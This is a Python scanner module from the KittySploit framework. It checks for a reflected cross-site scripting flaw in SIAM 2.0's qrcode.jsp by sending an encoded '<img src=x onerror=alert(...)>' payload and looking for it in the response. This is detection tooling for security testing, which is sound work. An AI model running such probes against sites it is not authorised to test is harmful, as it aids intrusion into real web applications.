#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A Reflected Cross-Site Scripting (XSS) vulnerability has been identified in the SIAM Invitation application."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SIAM 2.0 - Cross-Site Scripting Detection',
        'description': 'A Reflected Cross-Site Scripting (XSS) vulnerability has been identified in the SIAM Invitation application. The url parameter of the qrcode.jsp page does not properly sanitize user input, allowing the injection and execution of malicious scripts in the browser.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'siam', 'convite', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://vuldb.com/?submit.496171',
            'https://ftp.ogma.in/blog/understanding-and-mitigating-cve-2025-1359-siam-2-0-vulnerabilities',
        ],
    }

    def run(self):
        path = '/siam-convite/qrcode.jsp?url=1%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = ('<img src=x onerror=alert(document.domain)>', 'SIAM</a>',)
        ctype_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='medium',
                reason='SIAM 2.0 - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

